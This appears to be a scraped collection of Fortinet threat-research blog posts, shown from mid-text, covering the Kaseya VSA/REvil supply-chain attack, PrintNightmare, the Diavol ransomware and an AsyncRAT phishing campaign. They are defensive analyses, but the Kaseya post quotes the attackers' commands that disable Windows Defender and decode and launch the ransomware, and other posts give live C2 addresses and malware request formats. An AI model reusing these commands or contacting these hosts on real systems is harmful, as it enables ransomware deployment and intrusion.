TO RESTORE OPERATIONS. A PATCH WILL BE REQUIRED TO BE INSTALLED PRIOR TO RESTARTING THE VSA.\" Reports of the attack first surfaced when Huntress Labs, a managed detection and response (MDR) provider, first discovered the attack and posted their findings on Reddit. Timing the attack for the Independence Day holiday in the United States, this supply chain ransomware attack has impacted hundreds of organizations worldwide, both large and small, across all industries and managed service providers. Update as of July 7 th : This sophisticated supply-chain ransomware attack initially leveraged a vulnerability in the Kaseya VSA software to gain access to victim organizations, and then used REvil’s RaaS to infect those organizations with ransomware. For that reason, FortiGuard Labs is providing a separate Outbreak Alert analysis for both the initial exploitation of the Kaseya vulnerability and for the subsequent REvil ransomware attack. Each Outbreak Alert includes information about the attack itself, Fortinet product versions that provide protection, which products could break the attack sequence, threat hunting techniques, and other information. Go here for the Kaseya Outbreak Alert and here for the REvil Outbreak Alert . What to look for Threat indications that you should be aware of include: Initial notifications indicate that the \"KElevated######\" (SQL User) account performed this action. VSA admin user accounts are disabled only moments before ransomware is deployed Ransomware encryptor is dropped to c:\\kworking\\agent.exe The VSA procedure is named \"Kaseya VSA Agent Hot-fix” At least two tasks run the following: C:\\WINDOWS\\system32\\cmd.exe /c ping 127.0.0.1 -n 4979 > nul C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe echo %RANDOM% >> C:\\Windows\\cert.exe C:\\Windows\\cert.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe del /q /f c:\\kworking\\agent.crt C:\\Windows\\cert.exe & c:\\kworking\\agent.exe In addition, the encryptor (agent.exe) is signed with a valid digital signature that includes the following information: Name: PB03 TRANSPORT LTD. Email: Brouillettebusiness@outlook.com CN = Sectigo RSA Code Signing, CAO = Sectigo Limited, L = Salford, S = Greater Manchester, C = GB Serial #: 119acead668bad57a48b4f42f294f8f0 Issuer: https://sectigo.com/ When agent.exe runs, the following files are dropped into the hardcoded path C:\\Windows: MsMpEng.exe - the legit Windows Defender executable mpsvc.dll - the encryptor payload that is sideloaded by the legit Defender .EXE Recommendations Fortinet strongly recommends organizations using the Kaseya VSA platform to implement the current guidance in Kaseya's official recommendation : \"IMMEDIATELY shutdown your VSA server until you receive further notice from [Kaseya].” Fortinet Protections While the Kaseya VSA supply chain attack is how the threat actors got into the different networks, the ransomware used in those attacks is blocked by FortiGuard Labs through its AV coverage against known publicly available samples as: W32/Sodinokibi.EAD4!tr.ransom W32/Sodinokibi.8859!tr.ransom W32/Sodinokibi.5421!tr.ransom FortiGuard Labs has IPS coverage in place as: Kaseya.VSA.Remote.Code.Execution All known network IOC's are blocked by the WebFiltering client. The FortiGuard AntiVirus service is supported by FortiGate , FortiMail, FortiClient , and FortiEDR . The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date protections are protected. For FortiEDR protections, all published IOCs have been added to our Cloud intelligence service and will be blocked if executed on customer systems. The FortiGuard Responder team has published a Knowledge Base analysis on Kaseya and “ How FortiEDR detects Kaseya supply chain ransomware attack .” For FortiSandbox, all publicly known ransomware samples are detected by our behavior-based protection. Appendix The following advisory was posted by Kaseya: Information Regarding Potential Attack on Kaseya VSA The following FortiGuard Threat Signal report contains the latest information about this ransomware attack as well as updated information about FortiGuard Labs protections: Global Ransomware and Supply Chain Attack on Kaseya VSA Affecting Multiple Organizations Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/fortinet-releases-ips-signature-microsoft-printnightmare-vulnerability": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-01",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Breaking Update A potentially new zero-day Microsoft vulnerability, dubbed \"PrintNightmare,\" makes it possible for any authenticated attacker to remotely execute code with SYSTEM privileges on any machine that has the Windows Print Spooler service enabled (which is the default setting). Security researchers initially believed this vulnerability to be tied to CVE-2021-1675 (Windows Print Spooler Remote Code Execution Vulnerability), which was first disclosed in the June 8, 2021, Microsoft Patch Tuesday release. But there is now some question about whether this is the same issue or a new zero-day vulnerability. Last week, researchers at Chinese security firm QiAnXin technology published a video of a working proof-of-concept exploit of CVE-2021-1675 that highlighted how the vulnerability could be exploited both locally and remotely. After their proof-of-concept was disclosed, QiAnXin noticed, on June 21 st , that Microsoft had changed the title of the vulnerability, which was initially identified as only being exploitable locally, to reflect this remote code execution aspect. They also changed the vulnerability status from its original designation (high severity, privilege escalation) to critical severity, remote code execution. Adding to the confusion, Microsoft's current (as of this post) write-up for CVE-2021-1675 still states that it is a local vulnerability. Compounding the risk to organizations further, threat researchers at Sangfor Security, working independently and in parallel with QiAnXin, had developed their own working proof-of-concept code, which they posted to Github this past Tuesday (June 29th). While this detailed proof-of-concept has since been taken down, multiple cached copies still exist. It can be reasonably expected that bad actors will potentially leverage this information for future attacks. Microsoft has not yet provided any official statement to confirm whether this is a variation of the CVE-2021-1675 vulnerability or a new vulnerability altogether. But according to Bleeping Computer , PrintNightmare is not the same as CVE-2021-1675 but a new Windows Print Spooler zero-day vulnerability. This position is supported by reports from multiple threat researchers who have confirmed that they have achieved remote code execution with SYSTEM privileges on a fully patched system. Security researchers will continue to investigate. But regardless of the outcome of that investigation, neither a new nor an updated patch is currently available for this vulnerability. And proof-of-concept code now in the wild is able to exploit Windows Print Spoolers even after systems have been fully patched. As a result, administrators are strongly advised to stop and disable their spooler service, especially on domain controller systems. Vulnerable Systems It is unknown what versions of Windows are affected by this vulnerability. However, Benjamin Delpy's (creator of MimiKatz) research confirms that the latest Windows update of June 8, 2021-KB5003646 (OS Build 17763.1999) for Windows 10 is susceptible to this vulnerability. Fortinet Protections The FortiGuard Labs IPS team has coverage in place for this vulnerability and known proof-of-concept code as: MS.Windows.Print.Spooler.AddPrinterDriver.Privilege.Escalation. NOTE: The FortiGuard Labs IPS team was maintaining this signature under the CVE-2021-1675 designation. With the publication of the Microsoft advisory issued earlier (please see Update as of July 2 nd below), the FortiGuard Labs IPS team is now maintaining this signature under the new CVE-2021-34527 designation created by Microsoft. FortiEDR provides protection by blocking the load process of malicious DLLs that stem from the exploitation of the PrintNightmare vulnerability. FortiEDR will also block subsequent malicious activity taken by the payload post-execution. FortiEDR's threat hunting enhancement will also provide visibility into exploitation attempts and subsequent operations. For more information, the FortiGuard Threat Signal report for this vulnerability includes additional details, including a complete list of systems affected by CVE-2021-1675 for reference due to the possibility of cross-pollination. FortiGuard Labs continues to monitor this situation closely for any newly published proof-of-concept code for this vulnerability, as well as for any threats related to CVE-2021-1675 if applicable. Updates will be posted to the Threat Signal report. Update as of July 2, 2021: Microsoft has published an advisory on the Windows Print Spooler remote code execution vulnerability. https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 Microsoft has assigned CVE-2021-34527 to this issue and has confirmed exploitation in the wild. The advisory contains information for determining if the Print Spooler service is running, and provides mitigation steps as a workaround. FortiGuard Labs will continue to monitor the situation and provide updates as the situation warrants. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program .Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/diavol-new-ransomware-used-by-wizard-spider": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-01",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Windows Impact: Data encryption, Data destruction Threat Severity: Critical Diavol Introduction At the beginning of June, FortiEDR prevented a ransomware attack that had targeted one of our customers. After successfully stopping the attack, we were able to isolate two suspicious files that, at the time, were not found on VirusTotal: locker.exe and locker64.dll . In the timeline of the attack, locker.exe was deployed a day before locker64.dll. While we were able to identify locker64.dll to be a Conti (v3) ransomware, locker.exe appeared to be entirely different. So, let’s say hello to a new ransomware family. In this blog, we’ll dive into the inner workings of Diavol and its possible attribution to the criminal group known as Wizard Spider. First Encounter with Diavol The ransomware drops a ransom note in a text format in every folder it goes over, as can be seen in figure 1. According to the note, the authors claim they stole data from the victim’s machine, though we did not find a sample that was capable of performing that. This is either a bluff or a placeholder for future capabilities. Browsing to the URL led to us a website, seen in figures 2 and 3, from which we derived the name for the ransomware. As part of a rather unique encryption procedure, Diavol operates using user-mode Asynchronous Procedure Calls (APCs) without a symmetric encryption algorithm. Usually, ransomware authors aim to complete the encryption operation in the shortest amount of time. Asymmetric encryption algorithms are not the obvious choice as they significantly slower than symmetric algorithms. Technical Analysis locker.exe is a 32-bit executable compiled with Microsoft Visual C/C++ Compiler. The timestamp 2021-04-30 15:58:15 on the file supports the hypothesis that this ransomware is relatively new. Upon execution, Diavol starts by checking the command line arguments: \" -p \": path to a file with a list of paths to scan first for files. \" -log \": path to a log file. \" -m \": mode: net or local . net - encrypt network shares only. local - encrypt local drives only and ignore network shares. \" -h \": path to a file that contains specific hosts (names and IPs) to enumerate for shares. \" -s \": IP address that the initial register message will be sent to. Overrides the hardcoded address. The following command-line parameters were observed in the incident: -p \"C:\\b.txt\" -m local -log \"C:\\programdata\\log.txt\" The log file lists files that were encrypted. The authors didn’t remove the path to the debugging information file, unfortunately it didn’t divulge sensitive or incriminating details about the ransomware authors: D:\\Development\\Master\\onion\\locker.divided\\LockMainDIB\\Release\\LockMainDIB.pdb While Diavol is not packed nor has any anti-disassembly tricks, it does use an interesting anti-analysis technique to obfuscate its code. Its main routines are kept in bitmap images, which are stored in the PE resource section. Before calling each routine, it copies the bytes from the bitmap to a global buffer that has execute permissions. The imports used by each routine are also stored in the resource section under \" OFFSET \", with the same names as the bitmaps. Diavol has 14 different routines stored as bitmaps. They are called in the following order: · Create an identifier for the victim: The GENBOTID routine creates a unique identifier of the infected machine. It is composed of the following: <NetBIOS_computer_name> + <username> + “_W” + <OS major version in hex> + <OS minor version in hex> + <OS build number in hex> + “.” + <random_GUID_bytes in hex> · Initialize configuration: The SHAPELISTS routine copy the hardcoded configuration from the PE’s .data section. The configuration begins with the “ STATIC_DATA ” string and holds many unicode strings: - Base64 encoded RSA public key. - Server address for the initial registration. - Group ID for the initial registration. - List of excluded file extensions, file names and paths. - List of process names to terminate. - List of service names to stop. - List of paths to enumerate files. - List of filenames to delete. - Ransom note (in reverse). · Register with the C&C server and update configuration: The REGISTER payload uses the WinINet API to send a request to a server and returns the response status code. Diavol issues the C&C server a POST request to the hxxp://<server_address>/BnpOnspQwtjCA/register URL with the following headers: User-Agent: \"Agent\" Content-Type: application/x-www-form-urlencoded; charset=UTF-8 The body of the request is : cid=<unique_victim_id>&group=<group_id_from_config>ip_local1=111.111.111.111&ip_local2=222.222.222.222&ip_external=2.16.7.12 If the server returns status success, the ransomware will attempt to get an updated configuration from the C&C server. Since the “ -s ” command-line parameter was not provided, and as the configured address is 127.0.0.1 (localhost), the ransomware didn’t register itself or retrieve configuration updates. The FROMNET routine sends a request to the server using the WinINet API as well and returns the data from the response. To get an updated configuration and override the hardcoded values, the ransomware sends HTTP GET requests using the same headers as before, to: hxxp://173[.]232[.]146[.]118/Bnyar8RsK04ug/<unique_victim_id>/qqq123/<object_name> The following objects are supported: - /key - base64 encoded RSA public key. - /services - list of services to stop. - /priority - list of paths to scan for files for the first time. - /ignore - list of file extensions, filenames and paths to exclude. - /ext - list of file extensions to include. - /wipe - list of filenames to delete if they are found while enumerating the filesystem. - /landing - ransomware note. Inspecting the network traffic to 173.232.146.118 showed that the HTTP Cookie header contains the string “ diavol_session ”. · Stop services and processes: To maximize its effect on the target machine and to encrypt as many files as possible, the ransomware terminates running processes that can lock access to valuable files, such as databases, office applications, financial\\accounting software, web servers, and virtual machines. SERVPROC terminates services using the Service Control Manager (SCM) API. This API requires administrator permissions, which suggests the attackers are aware of this requirement and have taken appropriate steps beforehand. The sample attempts to stop the following services: sqlservr.exe , sqlmangr.exe , RAgui.exe , QBCFMonitorService.exe , supervise.exe , fdhost.exe , Culture.exe , RTVscan.exe , Defwatch.exe , wxServerView.exe , sqlbrowser.exe , winword.exe , GDscan.exe , QBW32.exe , QBDBMgr.exe , qbupdate.exe,axlbridge.exe , 360se.exe , 360doctor.exe , QBIDPService.exe , wxServer.exe , httpd.exe , fdlauncher.exe , MsDtSrvr.exe , tomcat6.exe , java.exe , wdswfsafe.exe . In addition, the malware developers don’t check to see if the API calls are successful. KILLPR use CreateToolhelp32Snapshot , Process32First and Process32Next APIs to enumerate the running processes in the system. The sample attempts to terminate the following list of processes: DefWatch , ccEvtMgr , ccSetMgr , SavRoam , dbsrv12 , sqlservr , sqlagent , Intuit.QuickBooks.FCS , dbeng8 , sqladhlp , QBIDPService , Culserver , RTVscan , vmware-usbarbitator64 , vmware-converter , VMAuthdService , VMnetDHCP , VMUSBArbService , VMwareHostd , sqlbrowser , SQLADHLP , sqlwriter , msmdsrv , tomcat6 , QBCFMonitorServicechrome.exe , outlook.exe , chrome.exe . The authors of Diavol made some mistakes in their hardcoded configuration. For starters, SERVPROC gets the list of the process names to terminate instead of service names to stop, and vice versa. The services list appears to include items that have nothing to do with services, like \"winword.exe\". In the processes list, only the last three items look like actual process names, while even one of them is wrong (\" QBCFMonitorServicechrome.exe \" looks like a concatenation of “ QBCFMonitorService ” and “ chrome.exe ”). · Initialize encryption key: RSAINIT initializes the RSA public key used for encryption with the standard WinCrypt API. · Find all drives to encrypt: ENMDSKS gets all the local drives in the system using GetLogicalDriveStrings API and checks to ensure they are not in the exclusions list. This routine will be skipped if the mode command-line parameter (“ -m ”) is set to “net”. The default list of the excluded file extensions, file names and paths is: *.exe , *.sys , *.dll , *.lock64 , *readme_for_decrypt.txt , *locker.txt , *unlocker.txt , %WINDIR%\\ , %PROGRAMFILES%\\ , %PROGRAMW6432%\\ , %TEMP%\\ SMBFAST and SMB routines enumerate available network shares for access. SMBFAST will only be called if the “-h” parameter is present. This routine scans for accessible network shares on specific hosts. SMB scans for accessible network shares on hosts found in the ARP table. Note that this routine will be skipped if the mode command-line parameter (“ -m ”) is set to “local”. · Find files to encrypt: FINDFILES traverses the file and directories in a given path. This routine is invoked multiple times: - Depending on the “-p” command-line or hardcoded configuration. - According to ENMDSKS results. - According to SMBFAST results. - According to SMB results. First, the routine checks to see if the given file or folder is not in the exclusion list. Then the routine determines whether the current item is in the list of files to delete. If not, it queues an APC on the current thread that gets the path to the item as an argument. · Prevent recovery by deleting shadow copies: VSSMOD drops and executes wscpy.exe in the current working directory, depending on the OS version (Windows Server 2003 or Vista and newer) and architecture (32 or 64-bit). Deleting the shadow copies snapshots is performed using the IVssBackupComponents COM object to call the DeleteSnapshots method. The dropped binaries are also kept in plaintext in the resource section under \" TEXT ”. These binaries contained a PDB reference source file that was used to compile the malware binary: D:\\Projects\\Repository\\LockCry.divided\\WipeShadowCopies64\\RelNoCRT\\WipeShadowCopies64.pdb D:\\Projects\\Repository\\LockCry.divided\\WipeShadowCopies64\\x64\\RelNoCRT\\WipeShadowCopies64.pdb D:\\Development\\Master\\onion\\locker.divided\\WipeShadowCopies64\\RelNoCRT_Win2003\\WipeShadowStorageWin2003_32.pdb D:\\Development\\Master\\onion\\locker.divided\\WipeShadowCopies64\\x64\\RelNoCRT_Win2003\\WipeShadowStorageWin2003_64.pdb · Encryption: As mentioned before, FINDFILES will queue an APC object with a file or directory path. For the APC to get executed, the main function calls SleepEx API in its final steps to set the thread to an alertable state. The APC routine checks if the argument is directory and will create the “ README_FOR_DECRYPT.txt ” ransom note regardless of whether the files in the directory were encrypted. If the argument is a file, the ENCDEFILE routine will be called. Unlike most other ransomwares, Diavol does not use any symmetric encryption but only RSA to encrypt the files. ENCDEFILE checks the file size. If it is less than 2,000,000 bytes, then only up to the first 11,700 bytes will be encrypted. If the file size is equal or greater than 2,000,000 bytes, then just the first 1,170,000 bytes will be encrypted. Each block of 11,700 bytes is split into ten chunks of 117 bytes each, and each chunk is encrypted using CryptEncrypt API. 117 plaintext bytes then become 128 bytes of ciphertext. Therefore, 11,700 bytes become 12,800 bytes following the encryption. Diavol overwrites the file and writes 11,700 encrypted bytes at the chunk’s original offset and appends the 1,100 remaining bytes to the end of the file. Finally, ENCDEFILE calls MoveFile API and appends a “ .lock64 ” extension to the filename. Once all APCs are dequeued and completed, the thread returns following the call to SleepEx . · Change the desktop wallpaper : Before the process terminates, CHNGDESK is invoked. First, it captures the desktop window and sets the background color to black. It then writes \" All your files are encrypted! For more information see “README-FOR-DECRYPT.txt \" with DrawText API to a bitmap image and saves it as \" encr.bmp \" in the public pictures folder. Finally, it changes the desktop wallpaper to the new image using the SystemParametersInfo API with the SPI_SETDESKWALLPAPER flag. Connections to Conti and Egregor As Diavol was deployed in conjunction with the Conti ransomware in this attack, albeit on different machines, we tried to see if there’s any correlation between them. Starting with the command-line parameters, the ones used by Diavol are nearly identical to those of Conti and used for the same functionality: log file, encrypt local drives or network shares, and scan specific hosts for network shares. In addition, Diavol and Conti both operate similarly with asynchronous I/O operations when queuing the file paths for encryption. There also might be a link between Diavol and Egregor ransomware. Some lines in the ransom note are identical, as can be seen in figure 12, although this is not reliable as it could simply be a red herring that Diavol’s authors planted. Some have reported a link between Wizard Spider, the threat actor behind Conti, and Twisted Spider, the threat actor behind Egregor. Allegedly, these gangs cooperate on various operations. They are also both notoriously known for double ransoming their victims (data theft and encryption). Summary In this blog, we presented a complete analysis of the new ransomware family - Diavol. Currently, the source of the intrusion is unknown. The parameters used by the attackers, along with the errors in the hardcoded configuration, hint to the fact that Diavol is a new tool in the arsenal of its operators which they are not yet fully accustomed to. As the attack progressed, we found more Conti payloads named locker.exe in the network, strengthening the possibility the threat actor is indeed Wizard Spider. Despite a few similarities between Diavol, Conti, and other related ransomware, it’s still unclear, however, whether there’s a direct link between them. And, there are a couple of major differences from attacks previously attributed to Wizard Spider & Co., namely: - No checks and balances to ensure the payload will not execute on Russian victims. - No clear evidence of double extortion in the environment was found. Fortinet Solutions FortiEDR detects and blocks the Diavol and Conti ransomwares attacks out-of-the-box without any prior knowledge or special configuration. It does this using its post-execution prevention engine to identify malicious activities, such as encrypting files or wiping the shadow copy, and then blocking them in real-time, as can be seen in figures 13 and 14: The FortiGuard AntiVirus service is supported by, and the FortiGuard AntiVirus engine is included in Fortinet’s FortiGate , FortiMail, FortiClient , and FortiEDR solutions. FortiGuard AntiVirus has coverage in place for the following samples: 85ec7f5ec91adf7c104c7e116511ac5e7945bcf4a8fdecdcc581e97d8525c5ac (Diavol, locker.exe) W32/Malicious_Behavior.VEX 426ba2acf51641fb23c2efe686ad31d6398c3dd25c2c62f6ba0621455a3f7178 (Conti v3, locker64.dll) W64/BazarLoader.AD!tr 4bfd58d4e4a6fe5e91b408bc190a24d352124902085f9c2da948ad7d79b72618 (Conti, locker.exe) W32/Conti.F!tr.ransom All network IOCs have been added to the FortiGuard WebFiltering blocklist. In addition, as part of our membership in the Cyber Threat Alliance, details of this threat were shared in real time with other Alliance members to help create better protections for customers. Appendix A: MITRE ATT&CK Techniques ID Description T1027 Obfuscated Files or Information T1082 System Information Discovery T1071.001 Application Layer Protocol: Web Protocols T1489 Service Stop T1562.001 Impair Defenses: Disable or Modify Tools T1135 Network Share Discovery T1490 Inhibit System Recovery T1559.001 Inter-Process Communication: Component Object Model T1486 Data Encrypted for Impact T1485 Data Destruction Appendix B: IOCs File Hashes (SHA256) 85ec7f5ec91adf7c104c7e116511ac5e7945bcf4a8fdecdcc581e97d8525c5ac (Diavol, locker.exe) 426ba2acf51641fb23c2efe686ad31d6398c3dd25c2c62f6ba0621455a3f7178 (Conti v3, locker64.dll) 4bfd58d4e4a6fe5e91b408bc190a24d352124902085f9c2da948ad7d79b72618 (Conti, locker.exe) File Names locker.exe locker64.dll wscpy.exe encr.bmp README_FOR_DECRYPT.txt File Paths %PUBLIC%\\Pictures\\encr.bmp IPs 173[.]232[.]146[.]118 URLs hxxp://<server_address>//BnpOnspQwtjCA/register hxxp://173[.]232[.]146[.]118/Bnyar8RsK04ug/ Domains r2gttyb5vqu6swf5[.]onion Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/spear-phishing-campaign-with-new-techniques-aimed-at-aviation-companies": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-06-27",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Obtain sensitive data from the victim's device and deliver additional malware Severity level: Critical Introduction to the Spear Phishing Campaign As we are all aware, spear phishing attacks are far more successful than untargeted ones and are most difficult to detect. The FortiGuard Labs team has identified yet another spear phishing campaign, this one targeting aviation companies. In this campaign, a malicious link that distributes an AsyncRAT payload is sent to aviation companies with a well-crafted message. AsyncRAT, an open-source remote administration tool, is used to steal credentials and other sensitive data. It also includes the capability to upload and download files on the compromised machine. This blog highlights the various stages of this spear phishing campaign and its newly adapted techniques. Spear Phishing Campaign Overview The infection cycle begins with phishing emails sent to aviation companies that contain malicious links disguised as pdf attachments. The link in the email directs the user to VB Script hosting sites, from which the initial payload (.vbs) is delivered. The .vbs script then drops the second stage payload, an xml file containing inline C# .NET assembly code that acts as a RAT loader. The loader hollows and injects the final payload, AsyncRAT, into the victim process (RegSvcs.exe). AsyncRAT, also known as RevengeRAT, connects to its C2 server, takes control of the compromised machine, and introduces additional payload. I will now dive into each of these steps in a bit more detail. Spear Phishing Email Spear phishing is a highly targeted attack resulting from extensive research on targeted users and their organizations conducted by threat actors. The phishing emails observed in this campaign were sent to multiple aviation companies. They all appear to be coming from the federal aviation authority using a spoofed sender address that matches with a “foreign operators affairs” email address for enquiries/approvals. The email goes through the extra step of having a signature and a logo to impersonate a federal authority. Also, the content is carefully crafted to create a sense of urgency by making it to look like a Reporting of Safety Incident (ROSI) from Air Traffic Control. In addition, the email contains malicious Google Drive links disguised as a pdf attachment. Most of the emails in this campaign contain the strings ROSI, AOP, Incident Report, as well as the attachment name “ROSI-AOP Incident Report Details, <date>”.pdf. (See Mitre ATT&CK technique – Spearphishing Link .) As of the time of writing this blog, these emails had not been flagged as phishing or suspicious by any of the VirusTotal engines. The IP address “192.145.239.18” is used to send all the emails in this campaign. This IP address is also associated with Snip3 Crypter, an aviation-themed campaign seen in April and May of 2021. A three-month review of its telemetry reveals a spike in the last few weeks, with the majority of visitors coming from the UAE, Canada, Argentina, Djibouti, and Fiji. Visual Basic Script (VBS) /Wscript When you click on the link (the fake pdf attachment), the user’s default browser is launched and directed to a VB Script hosting site. This site delivers the initial payload (.vbs), which, once executed, drops subsequent payloads and establishes persistence. The VB script “ROSI-AOP Incident Report Details,May 31st.vbs“ contains the next stage payload, “Good.xml”. This payload is encoded using Server.URLEncode() and obfuscated to evade detection. Antonin Foller's VBS decode function from PSTRUH Software ( http://www.motobit.com ) is used to decrypt the payload. After decryption, \"Good.xml\" is written to the victim's Temp directory, where it is launched using MSBuild.exe. If you’re not aware of this executable, it is present on all Windows machines with the .NET framework installed. It’s a trusted developer utility used to speed up the process of creating .NET applications. Because it is a trusted utility, adversaries use the tool in an effort to evade detection. (See Mitre ATT&CK technique – Trusted Developer Utilities Proxy Execution: MSBuild .) In the script below, the payload bytes are first substituted for de-obfuscation, then decoded before being written to the Temp directory. XML Once the VB script executes successfully, the Good.xml file, which contains inline C# assembly code, a loader dll, and the RAT payload, is dropped into the victim's Temp directory. All the files are saved as an ASCII byte array, and the RAT payload is also reversed to avoid signature-based detection. In this case, the adversary employs the method discovered by Casey Smith to compile and execute the inline C# code using the native Windows binary (MSBuild.exe). When Good.xml is executed, it first creates a file named \"Startups32.vbs\" in the system startup folder. The .vbs script contains code to run Good.xml file after each system startup to maintain persistence. (See Mitre ATT&CK technique – Persistence .) .NET RAT Loader After achieving persistence, Good.xml retrieves the .NET Rat loader from the byte array and loads it into the current application. The .NET RAT loader is contained in the byte array sBytes in the XML, which is loaded using the method Thread.GetDomain.Load(sBytes). The method Thread.GetDomain() returns the domain of the current running thread, while Load() dynamically loads the byte array assembly into the current application domain during runtime. The projFUD.dll, available in VirusTotal, is the RAT loader DLL in use. We observed that a few bytes of the file have been tweaked to avoid hash-based detection. The description and copyright mentions “VLC MEDIA PLAYER”. However, the file is not signed. Although the namespace and class name “ProjFUD.PA” in the loader is same as the one reported in the snip3 campaign, the PDB string retrieved from the loader DLL is different. It is likely to have come from a different author. After loading the .NET loader assembly, the function Execute() of the class ProjFUD.PA is called with the arguments payloadBytes (RAT payload) and RegSvcs.exe (the path of the victim process). The .NET assembly ProjFUD.dll acts as a RunPE loader as it hollows and injects the final payload, AsyncRAT, into the victim process. RegSvcs, a Windows command line utility for registering .NET Component Object Model (COM) assemblies, is used by an adversary to hide malicious payload. RegSvcs.exe is digitally signed by Microsoft and can be used to help bypass a process-based whitelist. (See Mitre ATT&CK technique – Process Injection: Process Hollowing .) CreateProcessA is first called to create the victim process RegSvcs.exe in a suspended state, with flags set to 134217732U (0x08000004) (i.e., CREATE_SUSPENDED and CREATE_NO_WINDOW are set to True.) This process does not run until the thread is resumed. While the process is suspended, ZwUnmapViewOfSection is called to unmap (hollow) the code from the process memory. This routine unmaps the entire view of the section containing buffer1 from the virtual address space, and on successful return, the virtual-address region occupied by the view is no longer reserved and available to map other views. Next, it allocates space for the payload using VirtualAllocEx, with size set to the payload length and page protection to PAGE_EXECUTE_READWRITE (0x40). It then injects the payload into the allocated space using WriteProcessMemory. The thread context is changed to point to the payload by calling SetThreadContext and the thread is finally resumed via ResumeThread to execute the payload AsyncRAT. After successfully injecting and executing the AsyncRAT payload, the loader exits. AsyncRAT AsyncRAT then takes command and control of the infected machine via a C2 server. As mentioned in the introduction, the AsyncRAT is an open-source Remote Access Tool (RAT) designed to remotely monitor and control other computers through a secure encrypted connection. It performs a variety of malicious tasks, and if you want to learn more about it, the GitHub AsyncRAT-C-Sharp link can help. AsyncRAT uses the following anti-analysis techniques to protect itself from being analyzed. Because Virtual Machines (VM) and sandboxes are used for the majority of dynamic analysis within the security community, many payloads, including this one, will try to evade dynamic analysis. In this case, the RAT retrieves the manufacturer via the WMI query “Select * from Win32 ComputerSystem” and looks for the strings \"VMware\" and \"VirtualBox”. It also checks for disk space because sandboxes and virtual machines typically have limited disk space. In addition, it loads the module SbieDll to detect “sandboxie”, an open-source sandboxing program for Windows. Lastly, it checks if the process is being debugged by calling IsDebuggerPresent(). (See Mitre ATT&CK technique – Virtualization/Sandbox Evasion .) The payload also includes a security software discovery technique. This technique is used to determine which security products are present on the compromised machine to shape the follow-on behaviors. Below is the command-line query used to enumerate the installed antivirus products. (See Mitre ATT&CK technique – Defense Evasion .) Once the information is gathered, it then sends the following information about the infected machine to the C2 RAT server. (See Mitre ATT&CK technique – Exfiltration Over C2 Channel .) This RAT hosts resources and additional payloads on Pastebin, an online content hosting service. In the below code snippet, the RAT client grabs an IP address from the pastebin website using WebClient.DownloadString() and connects to it. (See Mitre ATT&CK technique – Acquire Infrastructure: Web Services .) The AsyncRAT client requests that the RAT server send additional plugins and payloads, which are then executed in memory, as shown below. It employs a fileless technique to execute payloads in memory, reducing its footprint and avoiding traditional defenses that scan the disk for malicious files. To maintain its foothold, it installs a scheduled task if the payload is running as an administrator. The reason it checks for admin rights is that a task created with elevated privileges does not prompt the user to allow execution. If the payload isn’t running as an administrator, it will add an entry to the Registry Run keys, causing the program to run every time the user logs in. (See Mitre ATT&CK technique – Persistence .) Keylogging is the most prevalent type of input capture, and it’s used to steal credentials. This is done by intercepting the user’s keystrokes using Hooking API callbacks. This technique works by hooking into the Windows native API functions intended for processing keystroke data, and the callback function is invoked every time the user types something. (See Mitre ATT&CK technique – Input Capture: Keylogging .) C2 Server After successfully compromising the victim’s machine, the AsyncRAT payload connects to the RAT C2 server located at “franco.ddns.net” on port 2455 (79.134.225.18:2455). Since 2019, IP 79.134.225.18 has been linked to AsyncRAT / RevengeRAT, NanoCore, and BotNet attacks. It is associated with the ISP provider “ The PRIVACYFIRST Project”, which runs multiple VPN services and supports the TOR project. The C2 domain “franco.ddns.net” used in this campaign is just few weeks old, hence the associated spike. Conclusion The campaign analyzed in this blog is likely part of Snip3 Crypter-as-a-service, as some of the artifacts (i.e., Sender IP, C2 IP address, and the final payload) are the same. But this one doesn’t use PowerShell script. Instead, it employs a new technique to compile and execute inline C# code contained in an XML. This is yet another example of threat actors quickly adopting and evolving techniques to create more sophisticated and difficult-to-detect attacks. In addition to the Fortinet protections below, I would encourage you to review the Mitre attack techniques and measure how effective your current security controls are. Learn more about Mitre Att&CK and how to test your defenses . Fortinet Protections Fortinet customers are already protected from this RAT variant with FortiGuard’s Web Filtering and AntiVirus services, as follow: The C2 IP address is rated as \"Malicious\" by the FortiGuard Web Filtering service. The VB script is detected as “ VBS/Agent.OQP!tr ” and the xml file is detected as “ 